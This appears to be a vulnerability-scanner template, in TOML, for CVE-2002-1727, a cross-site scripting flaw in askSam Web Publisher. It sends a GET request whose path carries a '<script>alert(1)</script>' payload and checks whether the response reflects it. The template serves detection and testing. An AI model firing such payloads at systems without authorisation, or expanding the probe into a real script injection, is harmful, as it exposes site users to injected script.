[info]
author = "ave"
description = "检测 askSam Web Publisher 1/4 跨站脚本攻击漏洞，通过构造包含 script 标签的恶意 URL 验证 as_web.exe/as_web4.exe 是否存在输入过滤缺失，攻击者可诱骗用户点击访问执行任意脚本"
id = "POC-AVE-2002-0666"
name = "CVE-2002-1727 askSam XSS PoC"
severity = "medium"
tags = ["ave-2002-0666"]
vuln_id = [
    "CVE-2002-1727",
    "AVE-2002-0666",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/<script>alert(1)</script>"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert(1)</script>"]
